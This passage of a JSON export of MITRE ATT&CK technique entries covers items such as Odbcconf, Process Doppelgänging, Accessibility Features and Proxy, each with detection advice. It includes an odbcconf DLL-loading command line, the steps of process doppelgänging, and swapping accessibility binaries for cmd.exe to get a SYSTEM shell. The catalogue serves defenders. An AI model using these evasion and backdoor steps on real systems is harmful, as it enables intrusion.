      "detection": "Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)"
    },
    "T1218.008": {
      "id": "T1218.008",
      "name": "Odbcconf",
      "description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.008",
      "stix_id": "attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071",
      "created": "2020-01-24T15:01:32.917000+00:00",
      "modified": "2025-04-25T14:47:01.231000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded."
    },
    "T1593.002": {
      "id": "T1593.002",
      "name": "Search Engines",
      "description": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1593.002",
      "stix_id": "attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968",
      "created": "2020-10-02T16:50:12.809000+00:00",
      "modified": "2025-04-15T23:03:45.401000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1591.002": {
      "id": "T1591.002",
      "name": "Business Relationships",
      "description": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1591.002",
      "stix_id": "attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f",
      "created": "2020-10-02T16:27:55.713000+00:00",
      "modified": "2025-04-15T21:54:59.306000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1548.005": {
      "id": "T1548.005",
      "name": "Temporary Elevated Cloud Access",
      "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548.005",
      "stix_id": "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c",
      "created": "2023-07-10T16:37:15.672000+00:00",
      "modified": "2025-04-15T23:15:17.608000+00:00",
      "platforms": [
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1125": {
      "id": "T1125",
      "name": "Video Capture",
      "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1125",
      "stix_id": "attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf",
      "created": "2017-05-31T21:31:37.917000+00:00",
      "modified": "2025-04-25T15:15:42.332000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data."
    },
    "T1055.013": {
      "id": "T1055.013",
      "name": "Process Doppelg\u00e4nging",
      "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nProcess Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.013",
      "stix_id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
      "created": "2020-01-14T17:19:50.978000+00:00",
      "modified": "2025-04-25T14:47:03.621000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelg\u00e4nging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017) (Citation: hasherezade Process Doppelg\u00e4nging Dec 2017)\n\nScan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelg\u00e4nging Dec 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior."
    },
    "T1016": {
      "id": "T1016",
      "name": "System Network Configuration Discovery",
      "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1016",
      "stix_id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
      "created": "2017-05-31T21:30:27.342000+00:00",
      "modified": "2025-04-15T19:58:40.773000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Script: Script Execution",
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, {{LinkById|T1059.008} commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations.  Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1578.003": {
      "id": "T1578.003",
      "name": "Delete Cloud Instance",
      "description": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1578.003",
      "stix_id": "attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4",
      "created": "2020-06-16T17:23:06.508000+00:00",
      "modified": "2025-04-15T22:16:21.146000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Metadata",
        "Instance: Instance Deletion"
      ],
      "defense_bypassed": [],
      "detection": "The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances</code> event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete</code> to delete a VM.(Citation: Cloud Audit Logs)"
    },
    "T1593.003": {
      "id": "T1593.003",
      "name": "Code Repositories",
      "description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). \n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1593.003",
      "stix_id": "attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022",
      "created": "2022-08-09T13:01:43.314000+00:00",
      "modified": "2025-04-15T22:04:43.188000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1574.005": {
      "id": "T1574.005",
      "name": "Executable Installer File Permissions Weakness",
      "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.005",
      "stix_id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
      "created": "2020-03-13T11:12:18.558000+00:00",
      "modified": "2025-04-15T19:58:41.123000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Service: Service Metadata",
        "File: File Modification",
        "File: File Creation",
        "Process: Process Creation",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques."
    },
    "T1546.008": {
      "id": "T1546.008",
      "name": "Accessibility Features",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.008",
      "stix_id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
      "created": "2020-01-24T14:32:40.315000+00:00",
      "modified": "2025-04-15T19:58:41.211000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Creation",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>."
    },
    "T1496.002": {
      "id": "T1496.002",
      "name": "Bandwidth Hijacking",
      "description": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.(Citation: Unit 42 Leaked Environment Variables 2024)\n\nIn addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim\u2019s bandwidth is used for illegal activities.(Citation: Sysdig Proxyjacking)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1496.002",
      "stix_id": "attack-pattern--718cb208-6446-4572-a2f0-9c799c60091e",
      "created": "2024-09-25T13:44:35.412000+00:00",
      "modified": "2025-04-15T21:52:31.979000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "IaaS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "File: File Creation",
        "Command: Command Execution",
        "Process: Process Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1087": {
      "id": "T1087",
      "name": "Account Discovery",
      "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1087",
      "stix_id": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08",
      "created": "2017-05-31T21:31:06.988000+00:00",
      "modified": "2025-04-15T19:58:41.600000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)"
    },
    "T1090": {
      "id": "T1090",
      "name": "Proxy",
      "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1090",
      "stix_id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
      "created": "2017-05-31T21:31:08.479000+00:00",
      "modified": "2025-04-25T15:15:44.084000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183))."
    },
    "T1059": {
      "id": "T1059",
      "name": "Command and Scripting Interpreter",
